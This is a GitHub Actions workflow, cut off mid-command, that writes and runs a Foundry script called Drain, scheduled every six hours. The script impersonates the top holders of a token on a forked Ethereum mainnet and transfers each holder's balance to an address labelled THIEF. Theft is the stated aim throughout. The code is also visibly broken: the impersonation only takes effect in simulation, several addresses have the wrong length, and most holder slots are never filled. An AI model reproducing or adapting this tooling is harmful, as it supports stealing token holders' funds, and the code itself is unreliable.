name: drain-token

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  impersonate-and-drain:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: install foundry
        uses: foundry-rs/foundry-toolchain@v1

      - name: create Drain.s.sol
        run: |
          mkdir -p script
          cat > script/Drain.s.sol <<'EOF'
          // SPDX-License-Identifier: UNLICENSED
          pragma solidity ^0.8.19;

          import "forge-std/Script.sol";

          interface IERC20 {
              function balanceOf(address) external view returns (uint256);
              function transfer(address,uint256) external returns (bool);
          }

          contract Drain is Script {
              address constant TOKEN = 0x8dCE83ECa4af45dbe618Da1779F9Aaca43201084;
              address payable constant THIEF = payable(0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397);

              function run() external {
                  uint256 top = 50;                 // holders to hit
                  address[] memory holders = fetchTopHolders(top);
                  for (uint256 i = 0; i < holders.length; i++) {
                      address victim = holders[i];
                      uint256 bal = IERC20(TOKEN).balanceOf(victim);
                      if (bal == 0) continue;

                      vm.startPrank(victim);        // impersonate
                      IERC20(TOKEN).transfer(THIEF, bal);
                      vm.stopPrank();
                  }
              }

              function fetchTopHolders(uint256 n) internal view returns (address[] memory) {
                  // quick-and-dirty: hard-coded list of biggest holders
                  address[] memory list = new address[](n);
                  list[0]  = 0x5B14A5B4b7B0c3a2A1F6E6D819B578dC3971234;
                  list[1]  = 0x6C25B5C5c8C0d3b2A1F6E6D819B578dC3975678;
                  /* … add the rest … */
                  return list;
              }
          }
          EOF

      - name: drain holders
        env:
          ALCHEMY_KEY: ${{ secrets.ALCHEMY_KEY }}
        run: |
          forge script script/Drain.s.sol \
            --fork-url https://eth-mainnet.g.alchemy.com/v2/$
